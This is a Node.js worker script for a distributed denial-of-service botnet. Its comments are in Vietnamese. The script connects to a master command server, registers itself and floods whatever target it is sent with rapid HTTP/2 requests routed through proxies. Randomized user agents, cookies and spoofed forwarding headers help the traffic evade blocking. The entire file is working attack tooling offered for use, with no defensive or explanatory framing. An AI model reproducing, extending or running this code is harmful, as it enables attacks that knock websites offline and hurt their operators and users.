// worker.js - Chạy trên các VPS worker
// node worker.js <master_ip>

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const io = require('socket.io-client');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
const os = require('os');

// ==================== CONFIG ====================
const MASTER_IP = process.argv[2] || 'localhost';
const MASTER_PORT = 3000;

// ==================== LẤY IP THẬT ====================
function getLocalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                return net.address;
            }
        }
    }
    return 'unknown';
}

// ==================== TẢI PROXY ====================
let proxies = ['direct'];
try {
    if (fs.existsSync('./proxy.txt')) {
        proxies = fs.readFileSync('./proxy.txt', 'utf-8')
            .split('\n')
            .filter(line => line.includes(':'));
        console.log(`[+] Loaded ${proxies.length} proxies`);
    }
} catch (e) {}

// ==================== TLS CONFIG ====================
const secureContext = tls.createSecureContext({
    ciphers: "GREASE:ECDHE+AESGCM:ECDHE+CHACHA20",
    honorCipherOrder: true
});

// ==================== RANDOM ====================
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomString(len) { return crypto.randomBytes(len).toString('hex').slice(0, len); }
function randomIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }

// ==================== USER-AGENTS ====================
const uap = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0) Version/20.0 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/148.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0) Version/20.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 15; SM-S938B) Chrome/150.0.0.0 Mobile Safari/537.36'
];

// ==================== CLASS NetSocket ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\n\r\n`;
        const conn = net.connect(options.port, options.host, () => conn.write(payload));
        conn.setTimeout(3000);
        conn.on('data', d => d.toString().includes('200') ? callback(conn) : conn.destroy());
        conn.on('error', () => callback(null));
    }
}

// ==================== WORKER FLOOD ====================
function createWorker(target, rate) {
    const parsed = url.parse(target);
    const Socker = new NetSocket();
    let count = 0;
    
    setInterval(() => {
        if (count > 0) socket.emit('stats', { count });
        count = 0;
    }, 1000);
    
    function flood() {
        const proxy = randomElement(proxies);
        if (proxy === 'direct') return setTimeout(flood, 100);
        
        const [ph, pp] = proxy.split(':');
        
        const headers = {
            ':method': 'GET',
            ':path': parsed.path + '?' + randomString(8),
            ':authority': parsed.host,
            'user-agent': randomElement(uap),
            'accept': '*/*',
            'x-forwarded-for': randomIP(),
            'cookie': randomString(20)
        };

        Socker.HTTP({ host: ph, port: parseInt(pp), address: parsed.host + ':443' }, (conn) => {
            if (!conn) return;
            
            const tlsConn = tls.connect({
                socket: conn,
                servername: parsed.host,
                rejectUnauthorized: false,
                secureContext: secureContext
            });
            
            const client = http2.connect(parsed.href, { createConnection: () => tlsConn });
            
            client.on('connect', () => {
                for (let i = 0; i < rate; i++) {
                    try {
                        client.request(headers).end();
                        count++;
                    } catch (e) {}
                }
                setTimeout(() => client.close(), 100);
            });
        });
        
        setImmediate(flood);
    }
    
    flood();
}

// ==================== KẾT NỐI TỚI MASTER ====================
const socket = io(`http://${MASTER_IP}:${MASTER_PORT}`);

socket.on('connect', () => {
    console.log(`[+] Connected to master at ${MASTER_IP}:${MASTER_PORT}`);
    
    // Đăng ký với master
    socket.emit('register', { ip: getLocalIP() });
});

socket.on('attack', (data) => {
    console.log(`[+] Received attack command: ${data.target} for ${data.time}s`);
    
    // Fork workers
    if (cluster.isMaster) {
        for (let i = 0; i < data.threads; i++) {
            cluster.fork();
        }
        
        setTimeout(() => {
            process.exit(0);
        }, data.time * 1000);
    } else {
        createWorker(data.target, data.rate);
    }
});

socket.on('stop', () => {
    console.log(`[+] Received stop command`);
    process.exit(0);
});

socket.on('disconnect', () => {
    console.log(`[-] Disconnected from master`);
    process.exit(0);
});